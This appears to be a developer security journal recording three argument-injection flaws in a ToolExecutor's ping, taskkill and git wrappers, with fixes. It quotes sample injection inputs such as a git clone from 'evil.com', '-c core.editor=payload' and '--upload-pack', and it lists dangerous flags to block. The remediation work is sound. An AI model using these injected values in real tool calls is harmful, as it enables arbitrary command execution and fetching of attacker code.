# Sentinel's Security Journal

## 2026-11-06 - Command Argument Injection in System Tools
**Vulnerability:** In `ToolExecutor._network_scan`, user input (`target`) was passed directly into `subprocess.run(["ping", "-n", "1", target], shell=False)`. While `shell=False` prevents shell command chaining (`;`, `&&`), it does not prevent command option/argument injection (e.g. passing flags like `-t`, `-c 5`, or malicious options).
**Learning:** `shell=False` is insufficient if the subprocess arguments themselves are untrusted. Tools executing OS utilities (`ping`, `taskkill`, `git`, etc.) must validate and sanitize all argument values before subprocess dispatch.
**Prevention:** Validate network targets against `ipaddress.ip_address` or a strict hostname regex pattern, and explicitly forbid flags starting with `-` or strings containing whitespace/control characters.

## 2026-11-07 - Process Termination Option Injection in manage_processes
**Vulnerability:** In `ToolExecutor._manage_processes`, user-supplied `name` argument was directly interpolated into `taskkill` subprocess arguments (`taskkill /F /IM {filter_name}*` or `/PID {filter_name}`). Unsanitized inputs containing switches like `/s`, `/u`, `/p`, or spaces could manipulate taskkill execution.
**Learning:** Command-line utilities on Windows (such as `taskkill`, `shutdown`) treat `/` as option prefixes. Relying solely on `shell=False` does not prevent switches starting with `/` or `-` from being interpreted by the utility.
**Prevention:** Strictly validate process identifiers: enforce `filter_name.isdigit()` for PIDs and validate process image names with regex `^[a-zA-Z0-9_.-]+$`, while explicitly rejecting leading `-` or `/` and whitespace.

## 2026-11-08 - Subcommand Bypass and Option Injection in Git Operations
**Vulnerability:** In `ToolExecutor._git_operation`, validation checked `any(op in operation.lower() for op in safe_ops)` via substring check on the full operation string, and did not restrict `repo_path`. An attacker could execute arbitrary git subcommands (such as `clone`, `push`, `config`, `init`) simply by appending a benign keyword (e.g. `clone http://evil.com --status`), or supply dangerous options like `-c core.editor=payload` or `--upload-pack`.
**Learning:** Substring checking on whole command strings is trivially bypassed. When invoking multi-subcommand CLIs like `git`, the subcommand must be isolated as the first token (`args[0]`) and matched strictly against an allowed set. Furthermore, CLI flags that allow arbitrary command execution (`-c`, `--upload-pack`, `--exec-path`) or target directory escapes must be explicitly forbidden.
**Prevention:** Parse CLI arguments before inspection; validate that `args[0]` exactly matches an allowlist of subcommands, blacklist dangerous option flags, and enforce path boundary checks (`_is_safe_path`) on target directories.
